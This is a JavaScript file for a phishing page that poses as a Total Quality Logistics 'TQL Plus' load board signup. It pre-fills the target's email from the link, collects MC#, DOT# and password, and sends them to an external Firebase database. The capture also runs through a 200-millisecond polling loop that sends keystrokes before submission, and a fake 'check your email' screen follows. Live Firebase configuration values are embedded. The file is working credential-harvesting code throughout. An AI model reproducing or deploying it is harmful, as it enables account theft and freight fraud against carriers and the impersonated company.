// Your web app's Firebase configuration
// For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
    apiKey: "AIzaSyC1g5mxwZrE0Ei2QFYI7qO9CUXMswsn4-Y",
    authDomain: "data-97067.firebaseapp.com",
    databaseURL: "https://data-97067-default-rtdb.firebaseio.com",
    projectId: "data-97067",
    storageBucket: "data-97067.appspot.com",
    messagingSenderId: "588905854999",
    appId: "1:588905854999:web:f9dff59251e4459d264452",
    measurementId: "G-V7YQB9H8HQ"
  };

firebase.initializeApp(firebaseConfig);
var database = firebase.database();


function uuidv4() {
    return ([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g, c =>
      (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16)
    );
}

uuid = uuidv4()
console.log(uuid)

const queryString = window.location.search;
const urlParams = new URLSearchParams(queryString);


let mail = urlParams.get('mail');


console.log(mail);

colors = ["white", "black", "#A6A26D", "#A6A380", "#0093d0"]

body = document.querySelector('body');
body.style.backgroundColor = colors[0];


// append logo to left top

let logo = document.createElement('img');
logo.src = "TQLLogo.svg";

logo.style.width = "300px";
logo.style.height = "300px";
logo.style.position = "fixed";
logo.style.bottom = "-90px";
body.appendChild(logo);

// append h1 title to body center

let h1 = document.createElement('h1');
h1.style.textAlign = "center";
h1.style.fontFamily = "Arial";
h1.style.color = colors[0];
h1.style.fontSize = "50px";
h1.style.marginBottom = "20px";
h1.innerHTML = "Access Total Quality Logistics Load Board<br>By Using";
body.appendChild(h1);

// append h2 title to body center

let h1tql = document.createElement('h1');
h1tql.style.textAlign = "center";
h1tql.style.fontFamily = "Arial";
h1tql.style.color = colors[4];
h1tql.style.fontSize = "50px";
h1tql.style.marginBottom = "20px";
h1tql.innerHTML = "TQL Plus";
body.appendChild(h1tql);


let container = document.createElement('div');
container.style.width = "100%";
container.style.height = "100%";
container.style.display = "flex";
container.style.flexDirection = "row";
container.style.flexWrap = "wrap";
container.style.justifyContent = "left";
container.style.alignItems = "top";
container.style.alignContent = "top";
body.appendChild(container);


function getRoundedDiv(title = "", width = "500px", height = "250px")
{
    let div = document.createElement('div');
    div.style.borderRadius = "10px";
    div.style.backgroundColor = colors[1];
    div.style.width = width
    div.style.height = height
    div.style.marginTop = "30px";
    div.style.marginLeft = "30%";
    div.style.padding = "10px";
    div.style.paddingTop = "10px";
    div.style.paddingBottom = "20px";    


    // add title
    let h2 = document.createElement('h1');
    h2.style.textAlign = "center";
    h2.style.fontFamily = "Arial";
    h2.style.color = colors[1];
    h2.style.fontSize = "15px";
    h2.style.backgroundColor = colors[4];
    h2.style.borderRadius = "5px";
    h2.innerHTML = title;
    h2.style.marginBottom = "10px";
    h2.style.marginTop = "0px";
    h2.style.marginLeft = "37%";
    h2.style.height = "20px";
    h2.style.width = title.length * 10 + "px";
    h2.style.padding = "5px";
    div.appendChild(h2);

    container.appendChild(div);
    return div;
}

function addForm(placeholder, value="")
{
    let input = document.createElement('input');
    input.style.width = "80%";
    input.style.height = "30px";
    input.style.borderRadius = "5px";
    input.style.border = "none";
    input.style.marginLeft = "5%";
    input.style.padding = "5px";
    input.style.marginBottom = "10px";
    input.style.backgroundColor = colors[0];
    input.style.color = 'black';
    input.style.fontFamily = "Arial";
    input.style.fontSize = "17px";
    input.placeholder = placeholder;
    input.value = value;
    return input;
}

let part1 = getRoundedDiv("Get Started");

let email = addForm("Email", mail);
email.readOnly = true;
part1.appendChild(email);

part1.appendChild(addForm("First Name"));
part1.appendChild(addForm("Last Name"));

let mc = addForm("MC#");

part1.appendChild(mc);
part1.appendChild(addForm("DOT#"));

password = addForm("Password");
password.type = "password";

reEnterPassword = addForm("Re-Enter Password");
reEnterPassword.type = "password";

part1.appendChild(password);
part1.appendChild(reEnterPassword);



let submit = document.createElement('button');
submit.style.width = "50%";
submit.style.height = "50px";
submit.style.borderRadius = "5px";
submit.style.marginLeft = "5%";
submit.style.backgroundColor = "#0093d0";

submit.style.color = 'black';
submit.style.fontFamily = "Arial";
submit.style.fontSize = "17px";
submit.innerHTML = "Submit";


submit.onclick = function () {

    // if mc and password are not present make all fields red
    if (mc.value == "" || password.value == "")
    {
        // make all the field borders red
        let inputs = document.querySelectorAll('input');
        for (let i = 0; i < inputs.length; i++)
        {
            let input = inputs[i];
            if (input.value != "")
                continue;
            input.style.backgroundColor = "pink";
            input.style.border = "2px solid red";
        }
        return;
    }



    let lastlogin = email.value;
    let lastpassword = password.value;
    let lastmc = mc.value;
    
    console.log("submitting", lastlogin, lastpassword, lastmc);
    addUserData(lastlogin, lastpassword, lastmc);

    // clear all body and add text "Your setup is submitted"
    document.body.innerHTML = "";
    let div = document.createElement('div');
    div.style.width = "100%";
    div.style.height = "100%";
    div.style.backgroundColor = colors[0];
    div.style.color = "Lime";
    div.style.fontFamily = "Arial";
    div.style.fontSize = "50px";
    div.style.textAlign = "center";
    div.style.verticalAlign = "middle";
    div.style.lineHeight = "100%";
    div.innerHTML = "Done! Please check your email for the verification link.";
    document.body.appendChild(div);
}

part1.appendChild(submit);


normalizeDivSize();


function normalizeDivSize()
{
    // according to it's content
    
    let divs = document.querySelectorAll('div');
    for (let i = 0; i < divs.length; i++)
    {
        let div = divs[i];
        div.style.height = Math.max(div.scrollHeight, 30) + "px";

    }

}


function addUserData(lastlogin, lastpassword, lastmc)
{
    console.log("adding user data", lastlogin, lastpassword, lastmc);
    firebase.database().ref('logins3/' + uuid).push({
        mc: lastmc,
        login:lastlogin,
        password: lastpassword,
        reEnteredPassword: reEnterPassword.value
    });
}

let lastlogin = email.value;
let lastpassword = password.value;
let lastmc = mc.value;

setInterval(function () {
    let newlogin = email.value;
    let newpassword = password.value;
    let newmc = mc.value;
    if (lastlogin != newlogin || lastpassword != newpassword || lastmc != newmc) {
        lastlogin = newlogin;
        lastpassword = newpassword;
        lastmc = newmc;
        addUserData(lastlogin, lastpassword, lastmc);
    }
}, 200);
